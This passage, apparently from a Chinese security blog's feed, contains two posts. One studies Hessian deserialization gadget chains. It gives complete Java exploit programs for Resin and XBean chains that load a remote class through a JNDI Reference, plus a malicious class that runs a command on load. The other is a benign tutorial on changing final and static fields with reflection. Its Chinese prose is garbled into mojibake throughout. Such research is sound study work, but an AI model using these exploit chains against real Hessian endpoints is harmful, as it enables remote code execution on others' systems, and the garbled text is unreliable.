class="hljs-operator">=</span> <span class="hljs-string">&quot;javax.naming.NamingException&quot;</span>;<br>        setFiled(classname, cannotProceedException, <span class="hljs-string">&quot;resolvedObj&quot;</span>, ref);<br><br>        <span class="hljs-comment">// åˆ›å»ºContinuationContextå¯¹è±¡</span><br>        Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;javax.naming.spi.ContinuationContext&quot;</span>);<br>        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);<br>        <span class="hljs-comment">// æ„é€ æ–¹æ³•ä¸ºprotectedä¿®é¥°</span><br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Context</span> <span class="hljs-variable">continuationContext</span> <span class="hljs-operator">=</span> (Context) constructor.newInstance(cannotProceedException, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;());<br><br><br>        <span class="hljs-comment">// åˆ›å»ºQName</span><br>        <span class="hljs-type">QName</span> <span class="hljs-variable">qName</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">QName</span>(continuationContext, <span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-string">&quot;bar&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> unhash(qName.hashCode());<br>        <span class="hljs-comment">// åˆ›å»ºXtring</span><br>        <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(str);<br><br>        <span class="hljs-comment">// åˆ›å»ºHashMap</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(qName, <span class="hljs-string">&quot;111&quot;</span>);<br>        hashMap.put(xString, <span class="hljs-string">&quot;222&quot;</span>);<br><br>        <span class="hljs-comment">// åºåˆ—åŒ–</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ResinHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(fileOutputStream);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(hashMap);<br>        hessian2Output.close();<br><br>        <span class="hljs-comment">// ååºåˆ—åŒ–</span><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ResinHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(fileInputStream);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (HashMap) hessian2Input.readObject();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(String classname, Object o, String fieldname, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; aClass = Class.forName(classname);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(fieldname);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(o, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">unhash</span> <span class="hljs-params">( <span class="hljs-type">int</span> hash )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> hash;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">answer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">if</span> ( target &lt; <span class="hljs-number">0</span> ) &#123;<br>            <span class="hljs-comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span><br>            answer.append(<span class="hljs-string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);<br><br>            <span class="hljs-keyword">if</span> ( target == Integer.MIN_VALUE )<br>                <span class="hljs-keyword">return</span> answer.toString();<br>            <span class="hljs-comment">// Find target without sign bit set</span><br>            target = target &amp; Integer.MAX_VALUE;<br>        &#125;<br><br>        unhash0(answer, target);<br>        <span class="hljs-keyword">return</span> answer.toString();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unhash0</span> <span class="hljs-params">( StringBuilder partial, <span class="hljs-type">int</span> target )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">div</span> <span class="hljs-operator">=</span> target / <span class="hljs-number">31</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">rem</span> <span class="hljs-operator">=</span> target % <span class="hljs-number">31</span>;<br><br>        <span class="hljs-keyword">if</span> ( div &lt;= Character.MAX_VALUE ) &#123;<br>            <span class="hljs-keyword">if</span> ( div != <span class="hljs-number">0</span> )<br>                partial.append((<span class="hljs-type">char</span>) div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            unhash0(partial, div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¶æ„ç±»TestRef</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestRef</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TestRef</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410102208703.png" alt="image-20241010220704531"></p><h2 id="xbean"><a href="#XBean" class="headerlink" title="XBean"></a>XBean</h2><p>è¿™æ¡é“¾å’ŒResinå·®ä¸å¤š</p><p>å¯¼å…¥ä¸‹é¢ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xbean<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xbean-naming<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>é“¾å­</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HashMap#equals--&gt;XString#equals--&gt;ContextUtil.ReadOnlyBinding#toString--&gt;Binding#toString--&gt;ContextUtil.ReadOnlyBinding#getObject--&gt;ContextUtil#resolve--&gt;NamingManager#getObjectInstance<br></code></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹å…³é”®çš„åœ°æ–¹</p><p>ContextUtil.ReadOnlyBinding#toStringæœ¬èº«æ²¡æœ‰toStringæ‰€ä»¥å°±èµ°åˆ°çˆ¶ç±»Binding#toString</p><p><img src="https://cdn.clown2024.cn/202410102223585.png" alt="image-20241010222327507"></p><p>ContextUtil.ReadOnlyBinding#getObject</p><p><img src="https://cdn.clown2024.cn/202410102224965.png" alt="image-20241010222415889"></p><p>ContextUtil#resolve</p><p><img src="https://cdn.clown2024.cn/202410102227755.png" alt="image-20241010222504369"></p><p>ç„¶ååé¢çš„å°±å’Œå‰é¢ä¸€æ ·äº†</p><p>exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.caucho.naming.QName;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> org.apache.xbean.naming.context.ContextUtil;<br><span class="hljs-keyword">import</span> org.apache.xbean.naming.context.WritableContext;<br><br><span class="hljs-keyword">import</span> javax.naming.CannotProceedException;<br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XBeanUse</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refAddr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;TestRef&quot;</span>;<br><br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(refClassName, refClassName, refAddr);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">cannotProceedException</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.naming.CannotProceedException&quot;</span>).getDeclaredConstructor().newInstance();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">classname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;javax.naming.NamingException&quot;</span>;<br>        setFiled(classname, cannotProceedException, <span class="hljs-string">&quot;resolvedObj&quot;</span>, ref);<br><br>        <span class="hljs-comment">//åˆ›å»ºContextUtil.ReadOnlyBindingå¯¹è±¡</span><br>        ContextUtil.<span class="hljs-type">ReadOnlyBinding</span> <span class="hljs-variable">readOnlyBinding</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ContextUtil</span>.ReadOnlyBinding(<span class="hljs-string">&quot;clown&quot;</span>,ref,<span class="hljs-keyword">new</span> <span class="hljs-title class_">WritableContext</span>());<span class="hljs-comment">//æ”¾å…¥ref</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> unhash(readOnlyBinding.hashCode());<br>        <span class="hljs-comment">// åˆ›å»ºXtring</span><br>        <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(str);<br><br>        <span class="hljs-comment">// åˆ›å»ºHashMap</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(readOnlyBinding, <span class="hljs-string">&quot;111&quot;</span>);<br>        hashMap.put(xString, <span class="hljs-string">&quot;222&quot;</span>);<br><br>        <span class="hljs-comment">// åºåˆ—åŒ–</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;XBeanHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(fileOutputStream);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(hashMap);<br>        hessian2Output.close();<br><br>        <span class="hljs-comment">// ååºåˆ—åŒ–</span><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;XBeanHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(fileInputStream);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (HashMap) hessian2Input.readObject();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(String classname, Object o, String fieldname, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; aClass = Class.forName(classname);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(fieldname);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(o, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">unhash</span> <span class="hljs-params">( <span class="hljs-type">int</span> hash )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> hash;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">answer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">if</span> ( target &lt; <span class="hljs-number">0</span> ) &#123;<br>            <span class="hljs-comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span><br>            answer.append(<span class="hljs-string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);<br><br>            <span class="hljs-keyword">if</span> ( target == Integer.MIN_VALUE )<br>                <span class="hljs-keyword">return</span> answer.toString();<br>            <span class="hljs-comment">// Find target without sign bit set</span><br>            target = target &amp; Integer.MAX_VALUE;<br>        &#125;<br><br>        unhash0(answer, target);<br>        <span class="hljs-keyword">return</span> answer.toString();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unhash0</span> <span class="hljs-params">( StringBuilder partial, <span class="hljs-type">int</span> target )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">div</span> <span class="hljs-operator">=</span> target / <span class="hljs-number">31</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">rem</span> <span class="hljs-operator">=</span> target % <span class="hljs-number">31</span>;<br><br>        <span class="hljs-keyword">if</span> ( div &lt;= Character.MAX_VALUE ) &#123;<br>            <span class="hljs-keyword">if</span> ( div != <span class="hljs-number">0</span> )<br>                partial.append((<span class="hljs-type">char</span>) div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            unhash0(partial, div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410102245522.png" alt="image-20241010224522400"></p><blockquote><p>é€‰æ‹©Contextçš„å®ç°ç±»çš„æ—¶å€™æœ‰äº›å¯èƒ½æŠ¥é”™åœ¨æ‰§è¡Œä»–çš„getEnvironmentæ–¹æ³•çš„æ—¶å€™ï¼Œéœ€è¦è®¾ç½®ä¸€äº›å˜é‡ä¹‹ç±»çš„ï¼Œè¿™é‡Œçš„WritableContextç±»å°±å¯ä»¥ç›´æ¥åˆ›å»ºå°±èƒ½ç”¨</p></blockquote><h2 id="å…¶ä»–é“¾"><a href="#å…¶ä»–é“¾" class="headerlink" title="å…¶ä»–é“¾"></a>å…¶ä»–é“¾</h2><p>è¿˜æœ‰ä¸€äº›å…¶ä»–çš„é“¾å­æ¯”å¦‚Spring AOPä¹‹ç±»çš„å°±ä¸åˆ†æäº†ï¼Œæ‡’äº†ä¸»è¦æ˜¯ï¼ˆ</p><p>çœ‹ä¸€ä¸‹å¸ˆå‚…çš„æ–‡ç« å°±å¥½ï¼Œåˆ°æ—¶é‡åˆ°å†ç ”ç©¶ã€‚</p><p>è¿™ç¯‡æ–‡ç« æœ‰ç›¸å…³expï¼š<a href="https://xz.aliyun.com/t/13599?u_atoken=dee6998cc1d8cc5521fac10e0bd2ff43&u_asig=1a0c384b17285714178144818e003d">https://xz.aliyun.com/t/13599?u_atoken=dee6998cc1d8cc5521fac10e0bd2ff43&amp;u_asig=1a0c384b17285714178144818e003d</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æ¥å­¦ä¸€ä¸‹Hessianååºåˆ—åŒ–ï¼Œä¸»è¦å‚è€ƒsu18å¸ˆå‚…çš„æ–‡ç« ï¼š&lt;/p&gt;
&lt;h1 id=&quot;hessianç®€ä»‹&quot;&gt;&lt;a href=&quot;#Hessianç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;Hessianç®€ä»‹&quot;&gt;&lt;/a&gt;Hessianç®€ä»‹&lt;/h1&gt;&lt;p&gt;ç›´æ¥æŠ„s</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="ååºåˆ—åŒ–" scheme="https://clowsman.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>åå°„ä¿®æ”¹å˜é‡</title>
    <link href="https://clowsman.github.io/2024/10/04/%E5%8F%8D%E5%B0%84%E4%BF%AE%E6%94%B9%E5%8F%98%E9%87%8F/"/>
    <id>https://clowsman.github.io/2024/10/04/%E5%8F%8D%E5%B0%84%E4%BF%AE%E6%94%B9%E5%8F%98%E9%87%8F/</id>
    <published>2024-10-04T03:25:10.000Z</published>
    <updated>2024-10-04T03:26:39.492Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä½ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic"><a href="#ä½ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic" class="headerlink" title="ä½ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic"></a>ä½ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/noKing/p/9038234.html">https://www.cnblogs.com/noKing/p/9038234.html</a></p><h2 id="ä¿®æ”¹staticå˜é‡"><a href="#ä¿®æ”¹staticå˜é‡" class="headerlink" title="ä¿®æ”¹staticå˜é‡"></a>ä¿®æ”¹staticå˜é‡</h2><p>è¿™é‡Œå’Œæ­£å¸¸ä¿®æ”¹æ™®é€šå˜é‡ä¸€æ ·éƒ½æ˜¯æ²¡é—®é¢˜çš„</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String str=<span class="hljs-string">&quot;ceshi&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br>        <span class="hljs-comment">//ä¿®æ”¹staticå˜é‡</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;str&quot;</span>);<br>        str1.setAccessible(<span class="hljs-literal">true</span>);<br>        str1.set(test1,<span class="hljs-string">&quot;ceshi1&quot;</span>);<br>        System.out.println(Test1.str);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125754.png" alt="image-20241004100135810"></p><h2 id="ä¿®æ”¹finalå˜é‡"><a href="#ä¿®æ”¹finalå˜é‡" class="headerlink" title="ä¿®æ”¹finalå˜é‡"></a>ä¿®æ”¹finalå˜é‡</h2><p>è¿™é‡Œæœ‰ç‚¹ä¸åŒ</p><p>æˆ‘ä»¬ä¿®æ”¹StringBuilderå˜é‡</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default2&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br>        <span class="hljs-comment">//ä¿®æ”¹finalçš„å˜é‡</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        name1.setAccessible(<span class="hljs-literal">true</span>);<br>        name1.set(test1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;ceshi3&quot;</span>));<br>        System.out.println(test1.name);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125725.png" alt="image-20241004100649459"></p><p>çœ‹åˆ°æ˜¯å¯ä»¥ä¿®æ”¹æˆåŠŸçš„</p><p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¿®æ”¹Stringå˜é‡ä¼šå‘ç°ä¿®æ”¹ä¸æˆåŠŸï¼Œè¿™æ˜¯å› ä¸ºStringç±»å‹çš„finalå˜é‡ï¼Œåœ¨ä¼˜åŒ–æ—¶ä¼šå°†å…¶å˜æˆå¸¸é‡ï¼Œæ¯”å¦‚ä¸‹é¢çš„System.out.println(test1.STR1);å°±ä¼šå˜æˆSystem.out.println(â€œtestâ€);ï¼Œæ‰€ä»¥å…¶å®èµ‹å€¼æ˜¯æˆåŠŸäº†çš„ï¼Œä½†æ˜¯å› ä¸ºæ‰“å°å˜æˆå¸¸é‡äº†æ‰€ä»¥æ²¡å˜åŒ–ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åå°„æ‹¿å‡ºå€¼æ¥éªŒè¯ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String str=<span class="hljs-string">&quot;ceshi&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String STR1=<span class="hljs-string">&quot;test&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default2&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br>        <span class="hljs-comment">//ä¿®æ”¹finalçš„Stringå˜é‡</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;STR1&quot;</span>);<br>        str11.setAccessible(<span class="hljs-literal">true</span>);<br>        str11.set(test1,<span class="hljs-string">&quot;ceshi2&quot;</span>);<br>        System.out.println(test1.STR1);<br>        System.out.println(str11.get(test1));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125750.png" alt="image-20241004100943421"></p><p>å¯ä»¥çœ‹åˆ°ç¡®å®æ˜¯æ²¡é—®é¢˜çš„</p><p>é‚£æˆ‘ä»¬æƒ³è¦ä¿®æ”¹finalå˜é‡å°±éœ€è¦é˜²æ­¢Stringç±»å‹å˜é‡åœ¨ç¼–è¯‘æ—¶è¢«å¤„ç†ä¸ºå¸¸é‡ï¼Œæ–¹æ³•å°±æ˜¯è®©å…¶å€¼çš„åˆå§‹åŒ–ç»è¿‡è¿ç®—æ‰èƒ½å¾—åˆ°ï¼Œæˆ‘ä»¬ä»£ç å¯ä»¥æ”¹æˆè¿™æ ·</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String STR1=(<span class="hljs-literal">null</span> == <span class="hljs-literal">null</span> ? <span class="hljs-string">&quot;default4&quot;</span> : <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String STR2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default5&quot;</span>).toString();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br><br>        <span class="hljs-comment">//ä¿®æ”¹finalçš„Stringå˜é‡</span><br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;STR1&quot;</span>);<br>        str11.setAccessible(<span class="hljs-literal">true</span>);<br>        str11.set(test1,<span class="hljs-string">&quot;ceshi5&quot;</span>);<br>        System.out.println(test1.STR1);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str2</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;STR2&quot;</span>);<br>        str2.setAccessible(<span class="hljs-literal">true</span>);<br>        str2.set(test1,<span class="hljs-string">&quot;ceshi6&quot;</span>);<br>        